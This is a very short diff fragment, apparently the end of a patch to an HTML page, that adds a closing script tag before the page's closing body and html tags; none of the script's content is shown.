+</script>
 </body>
 </html>
+ 
